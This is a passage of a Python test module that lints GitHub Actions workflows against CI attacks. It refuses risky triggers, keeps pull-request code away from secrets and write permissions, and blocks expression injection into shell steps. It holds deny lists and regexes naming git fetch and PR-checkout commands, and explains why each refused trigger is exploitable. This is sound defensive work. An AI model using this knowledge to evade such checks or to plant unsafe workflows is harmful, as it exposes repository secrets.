"""Lints over the workflow files (SDLC.md 7.6 CI-PUBLIC-*). The public workflows live where this checkout keeps them: in `publish/github/workflows/` while that folder
exists (the development repository, which maps it to `.github/workflows/` of the published tree), otherwise in `.github/workflows/` (the published repository, where the
workflows are the public set). Every lint PARSES THE YAML (no text grep over the file), and each has a planted violation that turns it red: a mutation of the real public
file or an inline YAML string.

    L1 (public set)  a job of a workflow triggered by `pull_request` has `runs-on` exactly the string `ubuntu-latest`.
    L2 (public set)  (a) a job that runs PR code holds no `secrets.` reference and no write permission; (b) in a `pull_request` or `pull_request_target` workflow, a job that
                     holds any secret or any write permission checks out only the base, and runs no `gh pr checkout` or fetch of `refs/pull/`.
                     (d) the overlay secret (OVERLAY_SECRET) is referenced by no job and no workflow-level key except the one named job in L2_SECRET_EXCEPTIONS, which is
                     triggered by `pull_request_target` alone, names an environment, runs on the literal runner, holds read permissions only, checks out the base only (no `ref`,
                     no `repository`), uses no action but actions/checkout, and passes the secret only through a step's `env:` to a staged script.
    L3 (public set)  the self-hosted (non-literal) job carries the head.repo condition, and its first step is the API re-check: a `run:` step with no `if:` and no
                     `continue-on-error`, that exits non-zero on a mismatch (the step is also RUN here, against a fake `gh`).
    L4 (public set)  no `${{ }}` in a `run:` string or a github-script `script:` except a short allow-list of contexts that carry no author text.
    L4 (development set)   where the development repository has its own workflows, the older rule: no `${{ github.event.* }}`, `${{ github.head_ref }}` or `${{ inputs.* }}` there.
                     (The allow-list would make the development repository's own files churn; the named rule is kept for them.)

Scope and limits, stated once. These read WORKFLOW FILES only: composite actions and the scripts a step calls (merge_queue.py and the rest) are not read, so an injection
inside a script is outside every lint here. They are structural: the lints do not evaluate a GitHub expression, they look for named parts of it. They judge the files as
they are on the branch under test, so a PR can change a `pull_request` workflow and its own lint's input: these tests pin what the files on the default branch promise.

Rulings: the maintainers' ruling of 2026-11-23 (only collaborators open PRs, issues or comments; any collaborator is trusted; forks cannot open a PR).
"""

import os
import re
import subprocess

import pytest
import yaml

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SOURCE_DIR = os.path.join(ROOT, "publish", "github", "workflows")
DOT_DIR = os.path.join(ROOT, ".github", "workflows")
DEV_REPO = os.path.isdir(
    SOURCE_DIR
)  # True where the public set is authored (and the development repository's own workflows are .github/workflows)
PUBLIC_DIR = SOURCE_DIR if DEV_REPO else DOT_DIR
DEV_DIR = DOT_DIR if DEV_REPO else None
dev_only = pytest.mark.skipif(
    not DEV_REPO, reason="the development repository's own workflows and scripts exist only there; here the public set is .github/workflows"
)
HEAD_REPO_CLAUSE = "github.event.pull_request.head.repo.full_name == github.repository"
LITERAL = "ubuntu-latest"


def workflow_files(directory):
    return sorted(os.path.join(directory, f) for f in os.listdir(directory) if f.endswith((".yml", ".yaml")))


def load_text(text):
    wf = yaml.safe_load(text)
    assert isinstance(wf, dict) and isinstance(wf.get("jobs"), dict), "not a workflow: no jobs mapping"
    return wf


def events(wf):
    """The set of trigger names. YAML 1.1 reads the key `on` as the boolean True; `on` may be a string, a list or a mapping."""
    on = wf.get("on", wf.get(True))
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return set(on)
    return set(on or {})


# The triggers a public workflow may use. Everything else is refused outright (trigger_findings), so no rule here has to reason about what an exotic trigger's default
# checkout or payload holds. The comment- and review-driven workflow is the one named exception (L0_EXCEPTIONS below), for its own file only.
ALLOWED_TRIGGERS = ("pull_request", "pull_request_target", "push", "schedule", "workflow_dispatch")
REFUSED_TRIGGERS = {
    "merge_group": "its default checkout is the merge-group commit, which holds PR code, so a ref-less checkout under it runs PR code with whatever the job holds",
    "issue_comment": "runs base code on comment text written by anyone who can comment, with the PR (and so its head) one API call away",
    "pull_request_review": "runs base code on review text and the PR head, with the same reach as issue_comment",
    "pull_request_review_comment": "the same: review-comment text is author text and the PR head is reachable",
    "workflow_run": "runs with the base repository's token and secrets on artifacts and a head sha produced by another workflow's PR run",
    "repository_dispatch": "the payload is chosen by whoever holds a token that may dispatch, not by this repository's files",
    "issues": "runs base code on issue text written by anyone who can open an issue",
    "discussion_comment": "runs base code on comment text, like issue_comment",
    "release": "runs on a ref and a body chosen at release time, outside review",
    "workflow_call": "a reusable workflow runs in its caller's context, with whatever the caller passes: the rules here cannot see the caller",
}


# The named exceptions to the allow-list: a FILE NAME maps to the refused triggers that file alone may use, each with the reason it is safe THERE and the exact `types` it may
# run on. The rule that makes it safe is the same for each: the workflow reads only ids from the event and the text through the API, checks out the default branch (an explicit
# ref) and nothing of a PR, and runs the base code; L2 (d) pins each job's shape. Any other file using one of these triggers stays refused, with its reason from REFUSED_TRIGGERS.
CC = "comment-containment.yml"
L0_EXCEPTIONS = {
    CC: {
        "issue_comment": {
            "types": ["created", "edited"],
            "reason": "the workflow reads only the comment's id from the event and its text through the API as data, runs the default branch's script, and checks out nothing of a PR",
        },
        "issues": {
            "types": ["opened", "edited"],
            "reason": "the same for an issue's number: its title and body are read through the API as data and never reach a shell",
        },
    }
}
# `schedule` is allowed everywhere; for the file named here it is pinned too: exactly this one cron line, and the file's triggers are exactly its exceptions plus `schedule`. The review events
# are NOT in the table: their runs execute on a PR's merge ref, where the workflow file is the PR's own and a default-branch-only environment refuses the run, so they stay refused for
# this file as for every other (a review or review comment is swept on a schedule instead).
L0_SCHEDULE = {CC: [{"cron": "*/10 * * * *"}]}


def trigger_findings(name, wf):
    """Every trigger of the workflow must be in ALLOWED_TRIGGERS, or be one the file `name` is NAMED for in L0_EXCEPTIONS. A refused trigger is reported with its reason where
    REFUSED_TRIGGERS has one; any other trigger is refused as `not in the allow-list`. A file named in L0_EXCEPTIONS must use exactly the triggers of its entry (no other trigger
    beside them) and exactly the `types` each entry gives (a bare trigger, with every activity type, is refused)."""
    named = L0_EXCEPTIONS.get(name, {})
    expected = set(named) | ({"schedule"} if name in L0_SCHEDULE else set())
    out = [
        f"L0 {name}: trigger {e!r} is not allowed ({REFUSED_TRIGGERS.get(e, 'not in the allow-list')})"
        for e in sorted(events(wf))
        if e not in ALLOWED_TRIGGERS and e not in named
    ]
    if named:
        if events(wf) != expected:
            out.append(f"L0 {name}: triggers {sorted(events(wf))} are not exactly the {sorted(expected)} this file is named for")
        on = wf.get("on", wf.get(True))
        if name in L0_SCHEDULE and isinstance(on, dict) and on.get("schedule") != L0_SCHEDULE[name]:
            out.append(f"L0 {name}: trigger 'schedule' is {on.get('schedule')!r} (this file is named for exactly {L0_SCHEDULE[name]!r})")
        for e, entry in named.items():
            types = on.get(e, {}).get("types") if isinstance(on, dict) and isinstance(on.get(e), dict) else None
            if e in events(wf) and types != entry["types"]:
                out.append(f"L0 {name}: trigger {e!r} runs on types {types!r} (this file is named for exactly {entry['types']!r})")
    return out


def checkout_steps(job):
    return [s for s in job.get("steps", []) if str(s.get("uses", "")).startswith("actions/checkout@")]


# ---------------------------------------------------------------------------------------------------------------------------------- L1
def l1_findings(name, wf):
    """L1. In a workflow triggered by `pull_request`, `pull_request_review` or `pull_request_review_comment`, every job's `runs-on` is the literal string `ubuntu-latest`: a `vars.` reference, any other
    expression, a list, a mapping or another label is refused (a repository variable must not be able to move PR code onto a self-hosted runner)."""
    if not events(wf) & MERGE_REF_EVENTS:
        return []
    return [
        f"L1 {name}: job {j!r} runs-on {job.get('runs-on')!r} (must be the literal {LITERAL})"
        for j, job in wf["jobs"].items()
        if job.get("runs-on") != LITERAL
    ]


# ---------------------------------------------------------------------------------------------------------------------------------- L2
HEAD_REF = re.compile(
    r"github\s*\.\s*head_ref|github\s*\.\s*event\s*\.\s*pull_request\s*\.\s*head|github\s*\.\s*event\s*\.\s*workflow_run\s*\.\s*head|refs/pull/"
)
SECRET_WORD = re.compile(r"\bsecrets\b")
EXPR_BODY = re.compile(r"\$\{\{(.*?)\}\}", re.S)


def references_secrets(job):
    """True when the job names `secrets` in any expression (`secrets.X`, `secrets['X']`, `toJSON(secrets)`, `secrets` inside a longer expression) or has a `secrets:` key
    (a reusable-workflow call). The word in a step's display name or a comment is not a reference."""

    def keys(n):
        if isinstance(n, dict):
            return list(n) + [k for v in n.values() for k in keys(v)]
        if isinstance(n, list):
            return [k for v in n for k in keys(v)]
        return []

    return any(SECRET_WORD.search(body) for body in EXPR_BODY.findall(yaml.safe_dump(job))) or "secrets" in keys(job)


MERGE_REF_EVENTS = {"pull_request", "pull_request_review", "pull_request_review_comment"}  # the default checkout of these is the PR's merge commit


def runs_pr_code(wf, job):
    """True when the job (a) checks out the head: an actions/checkout whose `ref` (or `repository`) names the PR head (github.head_ref,
    github.event.pull_request.head.*, refs/pull/...); or (b) is in a workflow triggered by `pull_request`, `pull_request_review` or `pull_request_review_comment` and has an
    actions/checkout with NO `ref` (the default of those events is the PR's merge commit), or any checkout when the workflow also has `pull_request`; or (c) runs the queue driver's test
    command (`merge_queue.py test`, any spacing), which fetches the PR head as git objects and runs its checks without any head checkout step.
    LIMITS: a name-based rule for (c), so another script that runs PR code is not seen unless it is added here; a checkout whose `ref` is built by
    another route (a step output) is not seen; a job with no checkout and no (c) step is judged to run no PR code."""
    for s in checkout_steps(job):
        w = s.get("with") or {}
        if HEAD_REF.search(f"{w.get('ref', '')} {w.get('repository', '')}"):
            return True
        if events(wf) & MERGE_REF_EVENTS and not w.get("ref"):
            return True
    return any(re.search(r"merge_queue\.py\s+test\b", str(s.get("run", ""))) for s in job.get("steps", []))


def effective_permissions(wf, job):
    return job["permissions"] if "permissions" in job else wf.get("permissions")


def holds_secret_or_write(wf, job):
    """True when the job references `secrets` in ANY form (`secrets.X`, `secrets['X']`, `toJSON(secrets)`, any expression naming `secrets`), holds a write permission
    (its own `permissions` mapping, or `write`/`write-all`), or declares no `permissions:` at all (it then holds the repository's default token, whose scope may be write)."""
    if references_secrets(job):
        return True
    if "permissions" not in job:
        return True
    perms = job["permissions"]
    if perms in ("write-all", "write"):
        return True
    return isinstance(perms, dict) and any(v == "write" for v in perms.values())


# A job that holds a secret or a write permission may use actions/checkout only with no `ref` (and no `repository`) and may not fetch or check out another ref. A real job that
# needs one of those is named here with its reason; the exception covers `ref: ${{ github.event.repository.default_branch }}` only.
DEFAULT_BRANCH_REF = "${{ github.event.repository.default_branch }}"
L2_EXCEPTIONS = {
    (
        "merge-queue.yml",
        "plan",
    ): "checks out the default branch explicitly: a workflow_dispatch or push from another ref must not run that ref's scripts with these tokens (its `if` also requires the default branch)",
    (
        "merge-queue.yml",
        "queue",
    ): "the same: the write job runs the default branch's scripts only, whatever ref the event came from",
}
# The secrets of the public set that only a named job may reference (L2 (d)). A secret's holders are listed with the reason in L2_SECRET_EXCEPTIONS, and each holder's whole shape
# (its workflow's triggers, its environment, the one script and subcommand it runs) is in HOLDER_SHAPE. The names are constants here, in the workflow headers and in the scripts;
# renaming one is a change to all of them.
#   OVERLAY_READ_TOKEN      a read-only token for the private overlay repository, which holds the rules the leak checks apply (two holders: the pull-request check and the comment scan)
#   COMMENT_MINIMISE_TOKEN  a write token that hides a comment (one holder: the minimise job)
#   OVERLAY_ALERT_TOKEN     a token that opens an issue in the overlay repository (one holder: the alert job)
OVERLAY_SECRET = "OVERLAY_READ_TOKEN"
MINIMISE_SECRET = "COMMENT_MINIMISE_TOKEN"
ALERT_SECRET = "OVERLAY_ALERT_TOKEN"
SECRETS = (OVERLAY_SECRET, MINIMISE_SECRET, ALERT_SECRET)
L2_SECRET_EXCEPTIONS = {
    (
        "leak-check.yml",
        "leak-check",
    ): "reads the private rules from the overlay repository through the API with the read-only overlay token, and reads the pull request (title, body, commit messages, file blobs) through the API as data: "
    "it checks out the base repository only (no `ref`, no `repository`), runs the base branch's script, and never checks out, builds or runs anything from the pull request",
    (
        CC,
        "detect",
    ): "reads the same private rules with this workflow's own copy of the read-only token, and reads the comment or issue the event names, or the sweep's lists of reviews and review comments, through the API as data (ids only come from the event): "
    "it checks out the default branch only (no ref, no repository), runs that branch's script, and writes nothing to GitHub",
    (
        CC,
        "minimise",
    ): "holds the write token that hides a comment and nothing else: it runs one subcommand of the base script on an id and a kind that the detect job handed on, each checked against a fixed shape by the script",
    (
        CC,
        "alert",
    ): "holds the token that opens an issue in the overlay repository and nothing else: it runs one subcommand of the base script on rule names, a count and an address that the detect job handed on, each checked against a fixed shape by the script",
}
PR_TARGET = frozenset({"pull_request_target"})
HOLDER_SHAPE = {
    ("leak-check.yml", "leak-check"): {
        "secret": OVERLAY_SECRET,
        "triggers": PR_TARGET,
        "environment": "leak-check",
        "script": "leak_check.py",
        "subcommand": None,
        "ref": None,
    },
    (CC, "detect"): {
        "secret": OVERLAY_SECRET,
        "triggers": frozenset(L0_EXCEPTIONS[CC]) | {"schedule"},
        "environment": "comment-containment",
        "script": "comment_containment.py",
        "subcommand": "detect",
        "ref": None,
    },
    (CC, "minimise"): {
        "secret": MINIMISE_SECRET,
        "triggers": frozenset(L0_EXCEPTIONS[CC]) | {"schedule"},
        "environment": "comment-minimise",
        "script": "comment_containment.py",
        "subcommand": "minimise",
        "ref": None,
    },
    (CC, "alert"): {
        "secret": ALERT_SECRET,
        "triggers": frozenset(L0_EXCEPTIONS[CC]) | {"schedule"},
        "environment": "comment-alert",
        "script": "comment_containment.py",
        "subcommand": "alert",
        "ref": None,
    },
}
FORBIDDEN_RUN = re.compile(
    r"\bgit\s+(fetch|checkout|pull|switch|clone)\b|\bgh\s+(pr\s+checkout|co)\b|refs/pull/|\bpull/[0-9$]+[A-Za-z_]*/head\b"
)


def l2_findings(name, wf):
    """L2 (a). A job that runs PR code (runs_pr_code) must hold: no `secrets` reference anywhere in the job (its own `env`, `with`, `run`, `if`...), and
    `permissions` stated on the job as a non-empty mapping with `contents: read` and no value other than `read` or `none`. A missing job-level
    `permissions` is refused too (it would inherit the repository default, which may be write).
    L2 (b). EVERY job of EVERY workflow, whatever its trigger, declares `permissions:` on the job itself (none may rely on the repository's default token).
    L2 (c). A job that holds a secret, a write permission or the default token (holds_secret_or_write) uses actions/checkout only with no `ref` and no `repository`, and its
    run text never runs `git fetch`, `git checkout`, `git pull`, `git switch`, `git clone`, `gh pr checkout` or `gh co`, nor names `refs/pull/` or `pull/<n>/head`. A job named
    in L2_EXCEPTIONS may check out `ref: ${{ github.event.repository.default_branch }}` (the reason is in the table).
    LIMITS: `secrets: inherit` and a reusable workflow are not followed; `github.token` is not a `secrets` reference and is allowed (it is bounded by the job's permissions);
    run text is matched by spelling, so a fetch hidden in a script the step calls is not seen (those scripts are not read)."""
    out = []
    for j, job in wf["jobs"].items():
        if runs_pr_code(wf, job):
            if references_secrets(job):
                out.append(f"L2 {name}: job {j!r} runs PR code and references secrets.")
            perms = job.get("permissions")
            if not isinstance(perms, dict) or not perms:
                out.append(
                    f"L2 {name}: job {j!r} runs PR code and states no job-level permissions mapping (effective: {effective_permissions(wf, job)!r})"
                )
            else:
                if perms.get("contents") != "read":
                    out.append(f"L2 {name}: job {j!r} runs PR code and does not hold `contents: read`")
                for k, v in perms.items():
                    if v not in ("read", "none"):
                        out.append(f"L2 {name}: job {j!r} runs PR code and holds `{k}: {v}` (only read or none)")
        elif "permissions" not in job:
            out.append(f"L2 {name}: job {j!r} declares no `permissions:` (it would hold the repository's default token)")
        if not holds_secret_or_write(wf, job):
            continue
        for s in checkout_steps(job):
            w = s.get("with") or {}
            ref = w.get("ref")
            if ref is not None and not ((name, j) in L2_EXCEPTIONS and ref == DEFAULT_BRANCH_REF):
                out.append(
                    f"L2 {name}: job {j!r} holds a secret, a write permission or the default token and checks out `ref: {ref}` (no `ref` is allowed)"
                )
            if w.get("repository") is not None:
                out.append(
                    f"L2 {name}: job {j!r} holds a secret, a write permission or the default token and checks out another `repository`"
                )
        for s in job.get("steps", []):
            text = f"{s.get('run', '')} {yaml.safe_dump(s.get('with') or {})}"
            m = FORBIDDEN_RUN.search(text)
            if m:
                out.append(f"L2 {name}: job {j!r} holds a secret, a write permission or the default token and runs `{m.group().strip()}`")
    return out


STAGED_SCRIPT_RUN = re.compile(r"python3 \.github/workflows/scripts/[A-Za-z0-9_]+\.py( [a-z]+)?( --[a-z-]+[ =][0-9.]+)*")
DYNAMIC_SECRETS = re.compile(r"\bsecrets\b(?!\s*\.\s*[A-Za-z_])")
# The only expressions a holder job's `env:` values and `outputs:` may hold: the job's read-only token, a secret (checked separately to be its own), an earlier job's output or
# result, and its own step's output. Nothing the event carries (a comment's text, a title) can reach a holder's environment by this route.
HOLDER_EXPRESSION = re.compile(
    r"github\.token|secrets\.[A-Z_]+|needs\.[a-z-]+\.outputs\.[a-z]+|needs\.[a-z-]+\.result|steps\.[a-z]+\.outputs\.[a-z]+"
)
NEEDS_REF = re.compile(r"needs\.([a-z-]+)\.(outputs\.[a-z]+|result)")
STEPS_REF = re.compile(r"steps\.([a-z]+)\.outputs\.[a-z]+")


def mentions_secret(node, secret):
    return re.search(re.escape(secret), yaml.safe_dump(node), re.I) is not None


def mentions_overlay_secret(node):
    return mentions_secret(node, OVERLAY_SECRET)


def mentions_any_secret(node):
    return any(mentions_secret(node, s) for s in SECRETS)


def holder_run(spec):
    """The whole `run:` a holder's secret step may have: its one staged script, its subcommand if it has one, and numeric options."""
    sub = f" {spec['subcommand']}" if spec["subcommand"] else ""
    return re.compile(r"python3 \.github/workflows/scripts/" + re.escape(spec["script"]) + sub + r"( --[a-z-]+[ =][0-9.]+)*")


def holder_step_findings(name, wf, j, k, s, spec):
    """The steps of a named holder: only actions/checkout runs beside the secret, the checkout is the base's own (the default branch by explicit ref where the holder's events
    default to a PR merge commit), the secret is named only in the `env:` of a step that runs one staged script, no other secret is named there, and the `env:` holds no
    expression that could carry event text."""
    out = []
    uses = str(s.get("uses", ""))
    if uses and not uses.startswith("actions/checkout@"):
        out.append(f"L2 {name}: holder {j!r} step {k + 1} uses {uses.split('@')[0]!r} (only actions/checkout may run beside the secret)")
    if uses.startswith("actions/checkout@"):
        w = s.get("with") or {}
        if w.get("ref") != spec["ref"] or w.get("repository") is not None:
            out.append(f"L2 {name}: holder {j!r} checks out with a `ref` or a `repository` other than the base's own (the `ref` must be {spec['ref']!r})")
        if w.get("persist-credentials") is not False:
            out.append(f"L2 {name}: holder {j!r}: the checkout must set `persist-credentials: false`")
    if mentions_any_secret({x: v for x, v in s.items() if x != "env"}):
        out.append(f"L2 {name}: holder {j!r} step {k + 1} names the secret outside its `env:` (in `run`, `with`, `if` or its name)")
    env = s.get("env") or {}
    if any(mentions_secret(env, o) for o in SECRETS if o != spec["secret"]):
        out.append(f"L2 {name}: holder {j!r} step {k + 1} names a secret other than its own {spec['secret']} in its `env:`")
    if mentions_any_secret(env) and not STAGED_SCRIPT_RUN.fullmatch(str(s.get("run", "")).strip()):
        out.append(f"L2 {name}: holder {j!r} step {k + 1} passes the secret to something other than one staged script")
    out += expression_findings(name, wf, j, f"step {k + 1} `env:`", env.values(), spec)
    return out


def expression_findings(name, wf, j, where, values, spec):
    """The expressions of a holder's `env:` values and `outputs:`, each judged by HOLDER_EXPRESSION and then by what it points at:
    `secrets.<X>` only the holder's own secret; `needs.<k>.outputs.<x>` and `needs.<k>.result` only where `<k>` is a HOLDER_SHAPE job of THIS workflow whose own `outputs:` are all step
    outputs of steps that run a staged script (so a helper job that copies event text into its outputs cannot be relayed into a holder); `steps.<id>.outputs.<x>` only where `<id>` is a step of
    the holder's own job."""
    out = []
    own_steps = {s.get("id") for s in wf["jobs"][j].get("steps", []) if s.get("id")}
    for v in values:
        for body in EXPR_BODY.findall(str(v)):
            e = " ".join(body.split())
            if HOLDER_EXPRESSION.fullmatch(e) is None:
                ok = False
            elif e.startswith("secrets."):
                ok = e == f"secrets.{spec['secret']}"
            elif (m := NEEDS_REF.fullmatch(e)) is not None:
                ok = (name, m.group(1)) in HOLDER_SHAPE and m.group(1) in wf["jobs"] and provider_outputs_are_script_outputs(wf["jobs"][m.group(1)])
            elif (m := STEPS_REF.fullmatch(e)) is not None:
                ok = m.group(1) in own_steps
            else:
                ok = True
            if not ok:
                out.append(
                    f"L2 {name}: holder {j!r} {where} holds `${{{{ {e} }}}}`, which is not on the holder allow-list (its own secret, github.token, the output or result of a holder job of this workflow, its own step's output)"
                )
    return out


def holder_job_findings(name, wf, j, job, spec):
    out = []
    if events(wf) != spec["triggers"]:
        out.append(
            f"L2 {name}: holder {j!r}: the workflow has triggers {sorted(events(wf))} (this holder's workflow runs on {sorted(spec['triggers'])} alone)"
        )
    if job.get("runs-on") != LITERAL:
        out.append(f"L2 {name}: holder {j!r} runs-on {job.get('runs-on')!r} (must be the literal {LITERAL})")
    if not job.get("environment"):
        out.append(f"L2 {name}: holder {j!r} names no `environment:` (the secret's scope)")
    elif job["environment"] != spec["environment"]:
        out.append(f"L2 {name}: holder {j!r} names the environment {job['environment']!r} (the secret's scope is {spec['environment']!r})")
    perms = job.get("permissions")
    if not isinstance(perms, dict) or not perms or any(v != "read" for v in perms.values()):
        out.append(f"L2 {name}: holder {j!r} must declare `permissions:` with read values only (has {perms!r})")
    if runs_pr_code(wf, job):
        out.append(f"L2 {name}: holder {j!r} runs PR code")
    if "if" in job and mentions_any_secret(job["if"]):
        out.append(f"L2 {name}: holder {j!r} names the secret in its `if`")
    if mentions_any_secret(job.get("env") or {}):
        out.append(f"L2 {name}: holder {j!r} names the secret in a job-level `env:` (every step would hold it)")
    out += expression_findings(name, wf, j, "`outputs:`", (job.get("outputs") or {}).values(), spec)
    steps = job.get("steps", [])
    for k, s in enumerate(steps):
        out += holder_step_findings(name, wf, j, k, s, spec)
    shape_ok = (
        len(steps) == 2
        and str(steps[0].get("uses", "")).startswith("actions/checkout@")
        and "run" in steps[1]
        and holder_run(spec).fullmatch(str(steps[1]["run"]).strip()) is not None
        and mentions_secret(steps[1].get("env") or {}, spec["secret"])
    )
    if not shape_ok:
        out.append(
            f"L2 {name}: holder {j!r} must have exactly two steps: actions/checkout, then one `run:` of {spec['script']}"
            f"{' ' + spec['subcommand'] if spec['subcommand'] else ''} (numeric options only) that holds the secret in its `env:` "
            f"(has {len(steps)} step(s)); any other step runs beside the secret"
        )
    return out


def l2_secret_findings(name, wf):
    """L2 (d). Each secret of SECRETS is held by the named job(s) of L2_SECRET_EXCEPTIONS and by no one else, and each holder has exactly the shape HOLDER_SHAPE gives it:
    (1) no workflow-level key (`env`, `concurrency`, ...) and no other job names a secret (any case), and no other job reads `secrets` by a computed name (`secrets[...]`, `toJSON(secrets)`);
    (2) a named holder is in a workflow whose triggers are exactly its entry's, runs on the literal runner, names its own `environment:`, declares `permissions:` with read values only,
        runs no PR code, uses no action but actions/checkout (with no `repository`, `persist-credentials: false`, and no `ref` unless its entry names one: the default branch, for the
        workflow whose events would otherwise check out a PR merge commit), and names its ONE secret only in the `env:` of a step whose `run:` is its one staged script and
        subcommand (`python3 .github/workflows/scripts/<name>.py [<subcommand>]`): never in `run:`, `with:`, a job-level `env:` or a step `if:`, and no other secret beside it;
    (3) a holder's step `env:` values and its job `outputs:` hold only github.token, its own secret, the output or result of a HOLDER_SHAPE job of the same workflow whose outputs are
        script outputs, and its own step's output (expression_findings): a helper job that copies the event's text into its outputs is not a holder, so it cannot be relayed into one.
        LIMIT of (3): what a staged script writes to its outputs is the script's business, pinned by its own tests; no text lint sees it.
    LIMITS: names are read by spelling; a script that echoes its environment is outside what a workflow lint can see (the script's own tests pin that it prints no secret); `secrets: inherit`
    and a reusable workflow are not followed; the environments' deployment-branch policy is a repository setting and is not seen."""
    out = []
    top = {k: v for k, v in wf.items() if k != "jobs"}
    for s in SECRETS:
        if mentions_secret(top, s):
            out.append(f"L2 {name}: a workflow-level key references the secret {s} (only its named job may)")
    for j, job in wf["jobs"].items():
        if (name, j) in L2_SECRET_EXCEPTIONS:
            out += holder_job_findings(name, wf, j, job, HOLDER_SHAPE[(name, j)])
            continue
        out += [f"L2 {name}: job {j!r} references the secret {s} and is not its named holder" for s in SECRETS if mentions_secret(job, s)]
        if any(DYNAMIC_SECRETS.search(b) for b in EXPR_BODY.findall(yaml.safe_dump(job))):
            out.append(f"L2 {name}: job {j!r} reads `secrets` by a computed name (it could read one of {', '.join(SECRETS)})")
    return out


# ---------------------------------------------------------------------------------------------------------------------------------- L3
def strip_shell_comments(script):
    """The script without whole-line comments and without a trailing ` # ...` (a naive cut: a `#` inside quotes after a space is cut too, which only makes the
    non-zero-exit check stricter)."""
    return "\n".join(re.sub(r"\s#.*$", "", line) for line in script.splitlines() if not line.lstrip().startswith("#"))


def l3_findings(name, wf):
    """L3. Every job whose `runs-on` is not the literal `ubuntu-latest` (the one that may reach a self-hosted runner) must:
    (a) NOT carry a job-level condition on `github.event` (in its `if:`, either spelling): a condition on the event's PR skips the WHOLE matrix when a fork PR is
        the one that was labelled, so the in-repo candidates go untested;
    (b) `needs` a job of the same workflow that runs `plan_bases.py` (the plan: it drops fork heads in base code) and exports the outputs `forks` and `has_forks`, and the
        workflow's merge job (the job that runs `merge_queue.py merge`) must be passed `--forks` (it dequeues the dropped PRs);
    (c) have as its FIRST step a `run:` step (not a `uses:`, so no checkout before it) that calls `gh api repos/.../pulls/...`, reads `.head.repo.full_name`, and has a
        non-zero `exit` outside comments; the step has no `if:` and no `continue-on-error` (it cannot be skipped or ignored).
    The plan's fork drop itself is pinned in the scripts by test_the_plan_drops_fork_heads_*. LIMITS: names and strings are checked, not evaluated; the first step's script is
    RUN against a fake `gh` by test_the_api_re_check_step_*."""
    out = []
    for j, job in wf["jobs"].items():
        if job.get("runs-on") == LITERAL:
            continue
        cond = re.sub(r"\s+", " ", str(job.get("if", "")))
        if re.search(r"github\s*\.\s*event\b|github\s*\[", cond):
            out.append(
                f"L3 {name}: self-hosted job {j!r} has a job-level condition on `github.event` in its `if` (it would couple every cell to the event's PR, so a labelled fork PR skips them all)"
            )
        needs = job.get("needs") or []
        needs = [needs] if isinstance(needs, str) else needs
        plans = [
            n for n in needs if n in wf["jobs"] and any("plan_bases.py" in str(s.get("run", "")) for s in wf["jobs"][n].get("steps", []))
        ]
        if not plans:
            out.append(f"L3 {name}: self-hosted job {j!r} does not need a job that runs plan_bases.py (the plan that drops fork heads)")
        elif not all({"forks", "has_forks"} <= set(wf["jobs"][n].get("outputs") or {}) for n in plans):
            out.append(f"L3 {name}: self-hosted job {j!r}: the plan job does not export the outputs `forks` and `has_forks`")
        mergers = [
            k
            for k, jb in wf["jobs"].items()
            if any(re.search(r"merge_queue\.py\s+merge\b", str(s.get("run", ""))) for s in jb.get("steps", []))
        ]
        if not mergers or not all(any("--forks" in str(s.get("run", "")) for s in wf["jobs"][k].get("steps", [])) for k in mergers):
            out.append(
                f"L3 {name}: self-hosted job {j!r}: the merge job is not passed `--forks` (nothing would dequeue the fork heads the plan dropped)"
            )
        steps = job.get("steps") or []
        first = steps[0] if steps else {}
        script = strip_shell_comments(str(first.get("run", "")))
        if "uses" in first or not ("gh api" in script and "pulls/" in script and ".head.repo.full_name" in script):
            out.append(
                f"L3 {name}: self-hosted job {j!r} does not start with a `run:` step that calls `gh api .../pulls/<n>` and reads `.head.repo.full_name`"
            )
        elif "if" in first or str(first.get("continue-on-error", False)).lower() not in ("false",):
            out.append(
                f"L3 {name}: self-hosted job {j!r}: its first step has an `if:` or `continue-on-error`, so it can be skipped or ignored"
            )
        elif not re.search(r"\bexit\s+[1-9]", script):
            out.append(f"L3 {name}: self-hosted job {j!r}: its first step has no non-zero `exit`")
    return out


def fork_drop_findings(plan_source, merge_source):
    """The plan's fork drop, in the staged scripts (parsed, not run): `queued_prs` calls `is_fork_head`, and `plan_bases` defines `plan_forks` and calls `queued_forks`."""
    import ast

    out = []
    qp = next((n for n in ast.walk(ast.parse(merge_source)) if isinstance(n, ast.FunctionDef) and n.name == "queued_prs"), None)
    if qp is None or "is_fork_head" not in ast.unparse(qp):
        out.append("queued_prs does not call is_fork_head (a fork head would be planned and tested)")
    pf = next((n for n in ast.walk(ast.parse(plan_source)) if isinstance(n, ast.FunctionDef) and n.name == "plan_forks"), None)
    if pf is None or "queued_forks" not in ast.unparse(pf):
        out.append("plan_bases.plan_forks does not call queued_forks (the dropped fork heads would not be listed for the merge job)")
    return out


# ---------------------------------------------------------------------------------------------------------------------------------- L4
EXPR = re.compile(r"\$\{\{(.*?)\}\}", re.S)
UNTRUSTED = re.compile(r"(?<![\w.])(github\s*\.\s*event\b|github\s*\.\s*head_ref\b|inputs\s*\.)")
# The allow-list of the public set: a whole expression (no operator, no call) that is exactly one of these. Each carries no author text:
#   runner.temp / runner.os / runner.arch   the runner's own paths and platform
#   matrix.base / matrix.pr / matrix.head   values the plan job (base code) builds: a configured base branch name, an integer, a 40-hex sha
#   github.run_id / github.run_attempt / github.run_number   integers
#   github.repository / github.workspace    the repository's full name and the runner's checkout path
#   github.event_name                       one of GitHub's fixed event names
# NOT allowed, on purpose: env.* (re-expands what an env entry holds: the classic injection), steps.*.outputs.* (no public step outputs a digit or a sha yet; add one here
# with that justification), github.ref_name / github.head_ref / github.event.* / inputs.*, toJSON(...), format(...), any operator.
ALLOWED_EXPRESSIONS = re.compile(
    r"runner\.(temp|os|arch)|matrix\.(base|pr|head)|github\.(run_id|run_attempt|run_number|repository|workspace|event_name)"
)


def l4_findings(name, text, allow_list=False):
    """L4. Parse the YAML (yaml.compose, so each finding has a line) and look at every `${{ ... }}` in a step's `run:` string and in `with: script:` of an
    actions/github-script step, matched across lines (an expression split inside a block scalar is found).
    allow_list=True (the public set): refuse every expression that is not exactly one of ALLOWED_EXPRESSIONS (see its comment for each entry and for what is left out).
    allow_list=False (the development set): refuse an expression whose body names `github.event`, `github.head_ref` or `inputs.` anywhere (`a || github.event.x` too).
    The same expression in an `env:` value is the safe form and is NOT flagged: the shell reads it as data.
    LIMITS: workflow files only (composite actions and called scripts are not read); with the named rule (development set), `github['event']` index syntax and a value reached
